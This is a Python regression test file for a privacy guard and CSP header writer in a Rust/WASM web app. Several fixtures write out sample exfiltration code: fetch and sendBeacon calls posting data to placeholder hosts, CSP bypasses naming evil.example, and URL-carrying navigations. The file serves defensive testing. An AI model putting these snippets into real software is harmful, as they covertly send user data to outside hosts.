#!/usr/bin/env python3
"""Regression tests for scripts/privacy_check.py and scripts/write_headers.py.

Each test builds a small fake dist/ and crates/web in a temporary directory,
shaped like a real `trunk build --release` (top-level glue with the
wasm-bindgen loader, an index.html with an inline loader, a wasm with a wbg
import section, _headers from write_headers.py), applies one bypass, and
checks the guard now fails. The bypasses come from the Judge review of PR #18.

Run: python3 scripts/test_privacy_check.py   (CI runs it; no build needed)
"""

from __future__ import annotations

import contextlib
import io
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import privacy_check  # noqa: E402
import write_headers  # noqa: E402

GLUE = """\
import { report } from './snippets/paste2prompt-web-f115d4a07fd7736c/telemetry.js';
export function __wbg_report_abc(arg0, arg1) { report(getStringFromWasm0(arg0, arg1)); }
async function __wbg_init(module_or_path) {
    if (typeof module_or_path === 'string') {
        module_or_path = fetch(module_or_path);
    }
    if (!module.ok) {
        throw new Error(`failed to fetch Wasm: ${module.status} ${module.statusText} fetching '${module.url}'`);
    }
}
"""

INDEX = """\
<!doctype html>
<html lang="en">
  <head>
    <link rel="stylesheet" href="/style-1.css" />
    <script type="module">
import init, * as bindings from '/paste2prompt-web-1.js';
const wasm = await init({ module_or_path: '/paste2prompt-web-1_bg.wasm' });
    </script>
  </head>
  <body>{BODY}</body>
</html>
"""

MAIN_RS = """\
//! Browser entry point.
use leptos::prelude::*;

fn main() {
    leptos::mount::mount_to_body(App);
}
"""

CARGO_TOML = """\
[package]
name = "paste2prompt-web"

[dependencies]
leptos.workspace = true
"""

GOOD_CSP_TAIL = (
    "style-src 'self'; img-src 'self' blob: data:; connect-src 'self'; "
    "base-uri 'none'; form-action 'none'; frame-ancestors 'none'"
)


def _uleb(n: int) -> bytes:
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        out.append(b | (0x80 if n else 0))
        if not n:
            return bytes(out)


def _name(s: str) -> bytes:
    return _uleb(len(s)) + s.encode()


def wasm_with_imports(names: list[str], module: str = "wbg") -> bytes:
    types = b"\x01\x60\x00\x00"  # one func type: () -> ()
    imports = _uleb(len(names)) + b"".join(_name(module) + _name(n) + b"\x00\x00" for n in names)
    return (
        b"\0asm\x01\0\0\0"
        + b"\x01" + _uleb(len(types)) + types
        + b"\x02" + _uleb(len(imports)) + imports
    )


class Fixture:
    """A fake repo root with dist/ and crates/web, built like the real ones."""

    def __init__(self, root: Path) -> None:
        self.root = root
        self.dist = root / "dist"
        self.crate = root / "crates" / "web"
        self.dist.mkdir(parents=True)
        (self.crate / "src").mkdir(parents=True)
        self.write("dist/paste2prompt-web-1.js", GLUE)
        self.write("dist/style-1.css", "body { margin: 0; }\n")
        self.html()
        (self.dist / "paste2prompt-web-1_bg.wasm").write_bytes(
            wasm_with_imports(["__wbg_report_abc", "__wbindgen_throw"])
        )
        self.write("crates/web/src/main.rs", MAIN_RS)
        self.write("crates/web/Cargo.toml", CARGO_TOML)
        self.headers()

    def write(self, rel: str, text: str) -> Path:
        path = self.root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
        return path

    def html(self, body: str = "") -> None:
        self.write("dist/index.html", INDEX.replace("{BODY}", body))

    def headers(self, policy: str | None = None) -> None:
        """Write _headers via write_headers.py, or with an explicit CSP."""
        if policy is None:
            with contextlib.redirect_stdout(io.StringIO()):
                assert write_headers.main(["write_headers.py", str(self.dist)]) == 0
        else:
            self.write("dist/_headers", f"/*\n  Content-Security-Policy: {policy}\n")

    def script_hash(self) -> str:
        text = (self.dist / "index.html").read_text(encoding="utf-8")
        return write_headers.inline_script_hashes(text)[0]

    def run(self) -> tuple[int, str]:
        out = io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(out):
            rc = privacy_check.main(["--dist", str(self.dist), "--web-crate", str(self.crate)])
        return rc, out.getvalue()


class GuardTest(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.fx = Fixture(Path(self._tmp.name))

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def assertPasses(self) -> None:
        rc, out = self.fx.run()
        self.assertEqual(rc, 0, out)

    def assertFails(self, *needles: str) -> str:
        rc, out = self.fx.run()
        self.assertEqual(rc, 1, f"guard passed but should have failed:\n{out}")
        for needle in needles:
            self.assertIn(needle, out)
        return out

    def csp(self, middle: str) -> None:
        """A CSP whose script-src is valid, with `middle` in place of the rest."""
        self.fx.headers(f"default-src 'none'; script-src 'self' 'wasm-unsafe-eval' "
                        f"{self.fx.script_hash()}; {middle}")


class Baseline(GuardTest):
    def test_clean_fixture_passes(self):
        self.assertPasses()

    def test_permissions_policy_has_no_interest_cohort(self):
        text = (self.fx.dist / "_headers").read_text(encoding="utf-8")
        self.assertIn("Permissions-Policy:", text)
        self.assertNotIn("interest-cohort", text)


class Blocking1AllJs(GuardTest):
    """Judge finding 1: JS outside dist/*.js was never scanned."""

    TELEMETRY = (
        "export function report(data) {\n"
        '  fetch("https://example.invalid/collect", { method: "POST", body: data });\n'
        '  navigator.sendBeacon("https://example.invalid/b", data);\n'
        "}\n"
    )

    def test_snippet_js_is_scanned(self):
        # The Judge's reproduction: #[wasm_bindgen(module = "/telemetry.js")]
        # lands in dist/snippets/<crate>-<hash>/ behind an innocent shim name.
        self.fx.write("dist/snippets/paste2prompt-web-f115d4a07fd7736c/telemetry.js", self.TELEMETRY)
        self.assertFails("telemetry.js:2", "telemetry.js:3", "sendBeacon")

    def test_snippet_mjs_is_scanned(self):
        self.fx.write("dist/snippets/dep-1/inline0.mjs", "export const f = () => fetch('/x');\n")
        self.assertFails("inline0.mjs:1")

    def test_loader_allowlist_does_not_apply_to_snippets(self):
        self.fx.write("dist/snippets/dep-1/inline0.js", "module_or_path = fetch(module_or_path);\n")
        self.assertFails("inline0.js:1")

    def test_crate_js_source_is_scanned(self):
        self.fx.write("crates/web/telemetry.js", self.TELEMETRY)
        self.assertFails("crates/web/telemetry.js:2")

    def test_module_attr_outside_crate_is_scanned(self):
        self.fx.write("crates/shared/beacon.js", "navigator.sendBeacon('/b', d);\n")
        self.fx.write("crates/web/src/main.rs", MAIN_RS + (
            '#[wasm_bindgen(module = "../../shared/beacon.js")]\n'
            'extern "C" { fn ping(); }\n'
        ))
        self.assertFails("beacon.js:1")

    def test_missing_module_file_fails(self):
        self.fx.write("crates/web/src/main.rs", MAIN_RS + '#[wasm_bindgen(module = "/gone.js")]\n')
        self.assertFails("wasm_bindgen module file not found")

    def test_inline_js_raw_string_is_scanned(self):
        # sendBeacon is not a Rust-side pattern; only the inline_js scan sees it.
        self.fx.write("crates/web/src/main.rs", MAIN_RS + (
            '#[wasm_bindgen(inline_js = r#"\n'
            "export function report(d) { navigator.sendBeacon('/b', d); }\n"
            '"#)]\nextern "C" { fn report(d: &str); }\n'
        ))
        self.assertFails("in inline_js", "sendBeacon")

    def test_inline_js_plain_string_is_scanned(self):
        self.fx.write("crates/web/src/main.rs", MAIN_RS + (
            '#[wasm_bindgen(inline_js = "export function r(d) { new WebSocket(\\"wss://x\\"); }")]\n'
        ))
        self.assertFails("in inline_js", "WebSocket")

    def test_unknown_dist_file_type_fails_closed(self):
        self.fx.write("dist/worker.wasm.map", "{}")
        self.assertFails("file type the privacy guard does not scan")


class Blocking2Csp(GuardTest):
    """Judge finding 2: duplicate and per-directive CSP bypasses."""

    def test_duplicate_directive_fails(self):
        # The Judge's reproduction: browsers enforce the first connect-src and
        # script-src; the old parser kept the last and never saw the first.
        h = self.fx.script_hash()
        self.fx.headers(
            "default-src 'none'; connect-src https://evil.example; "
            "script-src data: 'unsafe-inline'; "
            f"script-src 'self' 'wasm-unsafe-eval' {h}; connect-src 'self'; "
            "style-src 'self'; img-src 'self' blob: data:"
        )
        self.assertFails(
            "connect-src appears more than once",
            "script-src appears more than once",
            "https://evil.example",
            "'unsafe-inline'",
        )

    def test_duplicate_is_case_insensitive(self):
        self.csp("CONNECT-SRC https://evil.example; connect-src 'self'")
        self.assertFails("connect-src appears more than once", "https://evil.example")

    def test_uppercase_default_src_is_checked(self):
        self.fx.headers(f"DEFAULT-SRC *; script-src 'self' {self.fx.script_hash()}; {GOOD_CSP_TAIL}")
        self.assertFails("CSP default-src allows *,")

    def test_blob_and_data_only_in_img_src(self):
        self.fx.headers(f"default-src 'none'; script-src 'self' data: blob: {self.fx.script_hash()}; "
                        f"{GOOD_CSP_TAIL}")
        self.assertFails("CSP script-src allows data:", "CSP script-src allows blob:")

    def test_blob_in_connect_src_fails(self):
        self.csp("connect-src 'self' blob:")
        self.assertFails("CSP connect-src allows blob:")

    def test_hash_and_wasm_eval_only_in_script_src(self):
        self.csp(f"style-src 'self' {self.fx.script_hash()} 'wasm-unsafe-eval'; connect-src 'self'")
        self.assertFails("CSP style-src allows 'sha256-", "CSP style-src allows 'wasm-unsafe-eval'")

    def test_unsafe_keywords_wildcards_and_hosts_fail_everywhere(self):
        for directive, src in [
            ("script-src", "'unsafe-inline'"),
            ("script-src", "'unsafe-eval'"),
            ("script-src", "'strict-dynamic'"),
            ("style-src", "'unsafe-inline'"),
            ("img-src", "*"),
            ("img-src", "https:"),
            ("img-src", "https://cdn.example"),
            ("connect-src", "wss:"),
            ("connect-src", "evil.example"),
            ("frame-ancestors", "https://embed.example"),
            ("font-src", "data:"),
        ]:
            with self.subTest(directive=directive, src=src):
                if directive == "script-src":
                    self.fx.headers(f"default-src 'none'; script-src 'self' {src} "
                                    f"{self.fx.script_hash()}; {GOOD_CSP_TAIL}")
                else:
                    self.csp(f"{directive} {src}")
                self.assertFails(f"CSP {directive} allows")

    def test_report_uri_fails(self):
        self.csp(f"{GOOD_CSP_TAIL}; report-uri /csp-report")
        self.assertFails("report-uri sends violation reports")

    def test_none_mixed_with_sources_fails(self):
        self.csp("connect-src 'none' 'self'")
        self.assertFails("mixes 'none'")

    def test_default_src_must_be_none(self):
        self.fx.headers(f"default-src 'self'; script-src 'self' {self.fx.script_hash()}; {GOOD_CSP_TAIL}")
        self.assertFails("default-src must be exactly 'none'")


class NonBlocking(GuardTest):
    def test_wrong_web_crate_path_fails(self):
        (self.fx.crate / "src" / "main.rs").unlink()
        self.assertFails("no .rs files")

    def test_double_slash_in_string_does_not_hide_fetch(self):
        # Comments are no longer stripped, so `//` in a URL can't end the line.
        self.fx.write("crates/web/src/main.rs", MAIN_RS + 'fn f() { let u = "https://x"; fetch(u); }\n')
        self.assertFails("main.rs:7", "fetch")

    def test_navigation_in_js_fails(self):
        for line in [
            "window.open('https://x?d=' + d);",
            "location = 'https://x?d=' + d;",
            "location.href = 'https://x?d=' + d;",
            "window.location.href='https://x';",
            "location.assign(u);",
            "document.location.replace(u);",
        ]:
            with self.subTest(line=line):
                self.fx.write("dist/snippets/nav/n.js", line + "\n")
                self.assertFails("n.js:1")

    def test_location_comparison_is_not_navigation(self):
        self.fx.write("dist/snippets/nav/n.js", "if (location == x) {}\n")
        self.assertPasses()

    def test_navigation_wasm_imports_fail(self):
        for name in ["__wbg_open_1a2b", "__wbg_location_9f", "__wbg_assign_3c",
                     "__wbg_replace_77", "__wbg_openwithurl_00"]:
            with self.subTest(name=name):
                (self.fx.dist / "paste2prompt-web-1_bg.wasm").write_bytes(wasm_with_imports([name]))
                self.assertFails("network or navigation API import")

    def test_navigation_in_rust_fails(self):
        self.fx.write("crates/web/src/main.rs", MAIN_RS + (
            "fn f(w: web_sys::Window) {\n    w.open_with_url(\"https://x\");\n    w.location();\n}\n"
        ))
        self.assertFails("open_with_url", ".location()")

    def test_html_url_attributes(self):
        for body in [
            '<img srcset="/a.png 1x, https://x.example/b.png 2x">',
            '<video poster="https://x.example/p.png"></video>',
            '<form action="https://x.example/collect"></form>',
            '<button formaction="//x.example/c">',
            '<a href="/" ping="https://x.example/p">',
            '<img src="  https://x.example/a.png">',
            '<img src="http:x.example/a.png">',
        ]:
            with self.subTest(body=body):
                self.fx.html(body)
                self.fx.headers()
                self.assertFails("reference to another origin")

    def test_html_local_urls_pass(self):
        self.fx.html('<img src="/a.png" srcset="/a.png 1x, b.png 2x"><img src="data:image/png;base64,AA==">')
        self.fx.headers()
        self.assertPasses()

    def test_css_url_and_import(self):
        for css in [
            "body { background: url(https://x.example/a.png); }",
            "body { background: url('//x.example/a.png'); }",
            '@import "https://x.example/a.css";',
        ]:
            with self.subTest(css=css):
                self.fx.write("dist/style-1.css", css + "\n")
                self.assertFails("CSS reference to another origin")

    def test_css_local_url_passes(self):
        self.fx.write("dist/style-1.css", "a { background: url(/i.png); } b { mask: url(data:image/svg+xml,x); }\n")
        self.assertPasses()


if __name__ == "__main__":
    unittest.main(verbosity=1)
